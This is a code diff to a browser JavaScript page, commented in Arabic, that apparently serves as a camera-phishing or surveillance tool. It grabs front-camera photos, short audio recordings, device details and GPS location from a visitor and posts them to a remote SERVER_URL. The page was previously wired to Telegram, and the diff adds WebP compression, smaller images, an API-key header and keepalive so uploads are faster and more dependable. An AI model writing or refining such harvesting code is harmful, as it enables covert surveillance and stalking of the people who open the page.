@@ -55,6 +55,7 @@ const SERVER_URL = window.APP_CONFIG.SERVER_URL;
   - استخدام timeouts و retries
   - واجهة حالة للمستخدم
   - إزالة دعم Telegram من الواجهة (يُرسل كل شيء إلى SERVER_URL فقط)
+  - تقليل حجم الصور باستخدام WebP و320x240 افتراضية للسرعة
 */
 
 const DEFAULT_TIMEOUT_MS = 12000; // وقت الانتظار الافتراضي للطلبات
@@ -81,6 +82,12 @@ function showStatus(message, type = 'info'){
 }
 
 function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+function getAuthHeaders(){
+    const h = {};
+    if (window.APP_CONFIG && window.APP_CONFIG.API_KEY) h['x-api-key'] = window.APP_CONFIG.API_KEY;
+    return h;
+}
 
 async function fetchWithRetry(url, options = {}, retries = FETCH_RETRIES, timeoutMs = DEFAULT_TIMEOUT_MS) {
     for (let attempt = 0; attempt <= retries; attempt++){
@@ -112,7 +119,16 @@ async function getMediaWithTimeout(constraints, timeoutMs = 8000){
     } catch(err){ clearTimeout(timer); throw err; }
 }
 
-async function capturePhotoAndSend({ label='snap', width=640, height=480 } = {}){
+// محاولات لاستخدام WebP أولاً ثم الرجوع إلى JPEG إذا لم يدعم المتصفح WebP
+async function canvasToOptimizedBlob(canvas){
+    // حاول WebP
+    const tryWebP = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.5));
+    if (tryWebP) return tryWebP;
+    // fallback to jpeg
+    return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.6));
+}
+
+async function capturePhotoAndSend({ label='snap', width=320, height=240 } = {}){
     showStatus('جاري طلب إذن الكاميرا...');
     let stream;
     try{ stream = await getMediaWithTimeout({ video: { facingMode: 'user' } }, 8000); }
@@ -127,18 +143,20 @@ async function capturePhotoAndSend({ label='snap', width=640, height=480 } = {})
     try{
         videoEl.srcObject = stream;
         await new Promise((res) => videoEl.onloadedmetadata = res);
-        await sleep(600);
+        await sleep(400);
         canvasEl.width = width; canvasEl.height = height;
         const ctx = canvasEl.getContext('2d');
         ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-        const blob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.6));
+
+        const blob = await canvasToOptimizedBlob(canvasEl);
 
         const payload = new FormData();
         payload.append('message', `نشاط: ${mode} - ${label}`);
-        payload.append('image', blob, `${label}.jpg`);
+        payload.append('image', blob, `${label}.webp`);
 
         showStatus('جاري إرسال البيانات إلى الخادم...');
-        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
+        const headers = getAuthHeaders();
+        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 10000);
         showStatus('تم الإرسال بنجاح.', 'success');
     } catch(err){
         console.error('capture/send error', err);
@@ -163,7 +181,8 @@ async function recordAudioAndSend(seconds = 4){
         const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
         const payload = new FormData(); payload.append('message', `نشاط: ${mode} - تسجيل صوتي`); payload.append('audio', blob, 'voice.ogg');
         showStatus('جاري إرسال التسجيل...');
-        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
+        const headers = getAuthHeaders();
+        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 12000);
         showStatus('تم إرسال التسجيل.', 'success');
     } catch(err){ console.error('record/send error', err); showStatus('فشل تسجيل الصوت أو الإرسال: ' + (err.message || err.name), 'error'); }
     finally{ if (stream) stream.getTracks().forEach(t => t.stop()); }
@@ -173,7 +192,11 @@ async function sendDeviceInfo(){
     let battery = 'غير معروف';
     if (navigator.getBattery){ try{ const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){} }
     const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}\n• اللغة: ${navigator.language}`;
-    try{ showStatus('جاري إرسال بيانات الجهاز...'); await fetchWithRetry(SERVER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: report }) }, FETCH_RETRIES, 10000); showStatus('تم إرسال بيانات الجهاز.', 'success'); }
+    try{ showStatus('جاري إرسال بيانات الجهاز...');
+        const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
+        await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: report }) }, FETCH_RETRIES, 10000);
+        showStatus('تم إرسال بيانات الجهاز.', 'success');
+    }
     catch(err){ console.error('sendDeviceInfo error', err); showStatus('فشل إرسال بيانات الجهاز.', 'error'); }
 }
 
@@ -182,7 +205,9 @@ function sendLocation(){
     showStatus('جاري الحصول على الموقع...');
     navigator.geolocation.getCurrentPosition(async (p)=>{
         const locText = `📍 [الموقع الجغرافي]: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
-        try{ await fetchWithRetry(SERVER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: locText }) }, FETCH_RETRIES, 10000); showStatus('تم إرسال الموقع.', 'success'); }
+        try{ const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
+            await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: locText }) }, FETCH_RETRIES, 10000);
+            showStatus('تم إرسال الموقع.', 'success'); }
         catch(err){ console.error('sendLocation error', err); showStatus('فشل إرسال الموقع.', 'error'); }
     }, (err)=>{ console.error('geolocation error', err); showStatus('تعذر الحصول على الموقع: ' + (err.message || err.code), 'error'); }, { timeout: 10000, maximumAge: 0 });
 }
@@ -190,12 +215,12 @@ function sendLocation(){
 async function runExperiment(){
     startBtn.disabled = true; startBtn.innerText = 'جاري المعالجة...'; showStatus('البدء: ' + mode);
     try{
-        if (mode === 'u1_snap1') await capturePhotoAndSend({ label: 'snap1', width: 640, height: 480 });
+        if (mode === 'u1_snap1') await capturePhotoAndSend({ label: 'snap1', width: 320, height: 240 });
         else if (mode === 'u1_snap3') { for (let i=1;i<=3;i++){ await capturePhotoAndSend({ label: `snap_${i}`, width: 320, height: 240 }); await sleep(700); } }
         else if (mode.startsWith('u2_')) await recordAudioAndSend(4);
         else if (mode.startsWith('u3_')) await sendDeviceInfo();
         else if (mode.includes('u4') || mode.includes('u5')){ await capturePhotoAndSend({ label: `advanced_${mode}`, width: 640, height: 480 }); sendLocation(); }
-        else await capturePhotoAndSend({ label: 'default_snap', width: 640, height: 480 });
+        else await capturePhotoAndSend({ label: 'default_snap', width: 320, height: 240 });
     } catch(err){ console.error('runExperiment error', err); showStatus('حدث خطأ غير متوقع: ' + (err.message || err.name), 'error'); }
     finally{ startBtn.disabled = false; startBtn.innerText = 'بدء النشاط 🚀'; }
 }
